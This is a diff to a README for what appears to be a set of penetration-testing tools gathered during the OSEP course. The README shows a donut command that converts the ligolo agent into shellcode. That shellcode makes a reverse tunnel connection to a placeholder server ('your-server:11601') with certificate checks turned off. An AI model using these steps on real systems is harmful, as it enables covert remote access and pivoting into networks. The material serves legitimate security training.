@@ -15,6 +15,7 @@ Just a bunch of tools built/gathered along the OSEP course.
 
 Make sure to convert agent.exe of ligolo to shellcode: 
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 
+
 Make sure you are running as x64 bit process before running: 
 - Powershell - `[Environment]::Is64BitProcess`
 - CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64) 
